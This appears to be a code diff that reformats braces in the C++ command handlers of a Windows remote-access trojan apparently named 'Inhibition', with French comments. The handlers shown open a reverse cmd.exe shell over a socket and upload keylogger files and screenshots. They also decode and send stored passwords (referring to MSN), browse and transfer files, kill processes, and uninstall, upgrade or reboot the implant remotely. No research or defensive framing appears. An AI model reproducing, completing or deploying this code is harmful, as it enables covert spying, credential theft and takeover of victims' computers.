@@ -27,10 +27,8 @@ using namespace Keyboard;
 
 #define SCREENSHOT_FILENAME "capture.jpg"
 
-namespace Inhibition
-{
-	void RemoteShell::operator()()
-	{
+namespace Inhibition {
+	void RemoteShell::operator()() {
 		LOG << "RemoteShell : Started";
 
 		SOCKADDR_IN sAddr;
@@ -48,17 +46,14 @@ namespace Inhibition
 		sAddr.sin_family = AF_INET;
 
 		SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
-		if(c == INVALID_SOCKET)
-		{
+		if(c == INVALID_SOCKET) {
 			LOG << "Unable to open socket for RemoteShell.";
 			return;
 		}
 
 		int retry = 5;
-		while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
-		{
-			if(!retry)
-			{
+		while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr))) {
+			if(!retry) {
 				closesocket( c );
 				return;
 			}
@@ -70,12 +65,9 @@ namespace Inhibition
 		si.hStdInput = (HANDLE)c;
 		si.hStdOutput = (HANDLE)c;
 		si.hStdError = (HANDLE)c;
-		if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
-		{
+		if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
 			LOG << "Can't start cmd.exe for RemoteShell (CreateProcess failed) : "+Common::toString(GetLastError());
-		}
-		else
-		{
+		} else {
 			LOG << "Waiting for process to end";
 			WaitForSingleObject( pi.hProcess, INFINITE );
 			CloseHandle( pi.hProcess );
@@ -85,111 +77,88 @@ namespace Inhibition
 		LOG << "RemoteShell : Ended";
 	}
 
-	void StartDownload::operator()()
-	{
+	void StartDownload::operator()() {
 		LOG << "StartDownload : Started";
-		try
-		{
+		try {
 			string path_file;
 			session() >> path_file;
 			LOG << "File to send is : " + path_file;
 			Upload transfer(path_file, session().stream());
 			transfer.addObserver(new LogTransfer);
 			transfer.launch();
-		}
-		catch(Common::Exception&)
-		{
+		} catch(Common::Exception&) {
 		}
 		CATCH_UNKNOWN_EXCEPTION
 		LOG << "StartDownload : Ended";
 	}
 
-	void StartUpload::operator()()
-	{
+	void StartUpload::operator()() {
 		LOG << "StartUpload : Started";
-		try
-		{
+		try {
 			string path_file;
 			session() >> path_file;
 			LOG << "File will be received in : " + path_file;
 			Download transfer(path_file, session().stream());
 			transfer.addObserver(new LogTransfer);
 			transfer.launch();
-		}
-		catch(Common::Exception&)
-		{
+		} catch(Common::Exception&) {
 		}
 		CATCH_UNKNOWN_EXCEPTION
 		LOG << "StartUpload : Ended";
 	}
 
-	void BrowseFileTree::operator()()
-	{
+	void BrowseFileTree::operator()() {
 		LOG << "BrowseFileTree : Started";
 		string directory_to_list;
 		session() >> directory_to_list;
 
 		// objets qui va lister les différents périphériques et répertoires
 		FileListing lister;
-		try
-		{
+		try {
 			// s'il faut lister le repertoire racine, il faut appeler la fonction
 			// de listes de périphériques
-			if(directory_to_list == "\\")
-			{
+			if(directory_to_list == "\\") {
 				string volumes = lister.getLogicalVolumes();
 				session() << volumes+FINISHED;
-			}
-			else
-			{
+			} else {
 				string directory_list = lister.getDirectoryList(directory_to_list);
-				if(directory_list.size())
-				{
+				if(directory_list.size()) {
 					session() << directory_list+FINISHED;
-				}
-				else
-				{
+				} else {
 					LOG << "Unable to read dir " + directory_to_list;
 					session() << FAILURE;
 				}
 			}
-		}
-		catch(Common::Exception&)
-		{
+		} catch(Common::Exception&) {
 		}
 		CATCH_UNKNOWN_EXCEPTION
 		LOG << "BrowseFileTree : Ended";
 	}
 
-	void SendEmail::operator()()
-	{
+	void SendEmail::operator()() {
 		LOG << "SendEmail : Started";
 		LOG << "SendEmail : Finished";
 	}
 
-	void UninstallClient::operator()()
-	{
+	void UninstallClient::operator()() {
 		LOG << "Uninstall : Started";
 		slave().uninstall();
 		LOG << "Uninstall : Finished";
 	}
 
-	void KillClient::operator()()
-	{
+	void KillClient::operator()() {
 		LOG << "KillServer : Started";
 		slave().exit();
 		LOG << "KillServer : Finished";
 	}
 
-	void UpgradeClient::operator()()
-	{
+	void UpgradeClient::operator()() {
 		LOG << "UpdateServer : Started";
 		slave().upgrade();
 		LOG << "UpdateServer : Finished";
 	}
 
-	void RebootClient::operator()()
-	{
+	void RebootClient::operator()() {
 		LOG << "RebootInhibition : Started";
 		SHELLEXECUTEINFO ShExecInfo;
 		memset(&ShExecInfo, 0, sizeof(ShExecInfo));
@@ -203,12 +172,9 @@ namespace Inhibition
 		ShExecInfo.nShow = SW_SHOW;
 		ShExecInfo.hInstApp = NULL;
 
-		if(!ShellExecuteEx(&ShExecInfo))
-		{
+		if(!ShellExecuteEx(&ShExecInfo)) {
 			LOG << "Unable to launch " << slave().getInstallPath();
-		}
-		else
-		{
+		} else {
 			LOG << "RebootInhibition : Finished";
 			slave().exit();
 		}
@@ -216,43 +182,33 @@ namespace Inhibition
 	}
 
 	SendKeylog::SendKeylog(KeyLogObserver * keyLogObserverArg) :
-		keyLogObserver(keyLogObserverArg)
-	{
+		keyLogObserver(keyLogObserverArg) {
 	}
 
-	void SendKeylog::operator()()
-	{
+	void SendKeylog::operator()() {
 		LOG << "SendKeylog : Started";
-		try
-		{
+		try {
 			keyLogObserver->flush();
 
 			// si le keylog est vide, on y met un message pour dire a l'utilisateur que rien n'a
 			// encore été tapé
-			if(!System::Size(keyLogObserver->getLogFilePath()))
-			{
+			if(!System::Size(keyLogObserver->getLogFilePath())) {
 				LOG << "Log file empty";
 				session() << KEYLOG_EMPTY;
-			}
-			else
-			{
+			} else {
 				session() << SUCCESS;
 				Upload upload (keyLogObserver->getLogFilePath(), session().stream());
 				upload.launch();
 			}
-		}
-		catch(...)
-		{
+		} catch(...) {
 			LOG << "SendKeylog : error";
 		}
 		LOG << "SendKeylog : Finished";
 	}
 
-	void SendScreenshot::operator()()
-	{
+	void SendScreenshot::operator()() {
 		LOG << "SendScreenshot : Started";
-		try
-		{
+		try {
 			int quality = 10;
 			string buffer_quality;
 			LOG << "Waiting quality";
@@ -267,105 +223,83 @@ namespace Inhibition
 			upload.launch();
 			LOG << "Screenshot sent, deleting it";
 			remove(SCREENSHOT_FILENAME);
-		}
-		catch(Common::Exception&)
-		{
+		} catch(Common::Exception&) {
 		}
 		CATCH_UNKNOWN_EXCEPTION
 		LOG << "SendScreenshot : Finished";
 	}
 
-	void SendPasswords::operator()()
-	{
+	void SendPasswords::operator()() {
 		LOG << "SendPasswords : Started";
-		try
-		{
+		try {
 			string passes = Malicious::decodeAllPasswords(',');
-			if(passes.size())
-			{
+			if(passes.size()) {
 				LOG << "Sending passwords : " + passes;
 				session() << passes;
-			}
-			else
-			{
+			} else {
 				session() << FINISHED;
 			}
-		}
-		catch(Malicious::ErrorWhileRetrieving&)
-		{
+		} catch(Malicious::ErrorWhileRetrieving&) {
 			session() << "MSN is not installed";
-		}
-		catch(...)
-		{
+		} catch(...) {
 			session() << "Unable to aggregate passwords";
 		}
 		LOG << "SendPasswords : Finished";
 	}
 
-	void SendProcessList::operator()()
-	{
+	void SendProcessList::operator()() {
 		LOG << "SendProcessList : Started";
 		session() << System::Process::GetAllRunningProcess()+FINISHED;
 		LOG << "SendProcessList : Ended";
 	}
 
-	void KillProcess::operator()()
-	{
+	void KillProcess::operator()() {
 		LOG << "Inhibition Kill Process : Started";
 		string buffer;
 		session() >> buffer;
 		LOG << "Process to kill : " + buffer;
-		if(System::Process::KillProcess(buffer))
-		{
+		if(System::Process::KillProcess(buffer)) {
 			LOG << "Inhibition killed process";
 			session() << SUCCESS;
-		}
-		else
-		{
+		} else {
 			LOG << "Unable to kill process";
 			session() << FAILURE;
 		}
 		LOG << "Inhibition Kill Process : Finished";
 	}
 
-	void SendWindowsVersion::operator()()
-	{
+	void SendWindowsVersion::operator()() {
 		LOG << "SendWindowsVersion : Started";
 		LOG << "Sending system version : " << System::getSystemVersionString();
 		session() << System::getSystemVersionString();
 		LOG << "SendWindowsVersion : Finished";
 	}
 
-	void SendClientName::operator()()
-	{
+	void SendClientName::operator()() {
 		LOG << "SendClientName : Started";
 		session() << slave().getConnection().name;
 		LOG << "SendClientName : Finished";
 	}
 
-	void Shutdown::operator()()
-	{
+	void Shutdown::operator()() {
 		LOG << "Shutting down";
 		System::shutdown();
 		slave().exit();
 	}
 
-	void Reboot::operator()()
-	{
+	void Reboot::operator()() {
 		LOG << "Rebooting";
 		System::reboot();
 		slave().exit();
 	}
 
-	void Logout::operator()()
-	{
+	void Logout::operator()() {
 		LOG << "Logout";
 		System::logout();
 		slave().exit();
 	}
 
-	void Hibernate::operator()()
-	{
+	void Hibernate::operator()() {
 		LOG << "Standby";
 		System::hibernate();
 	}
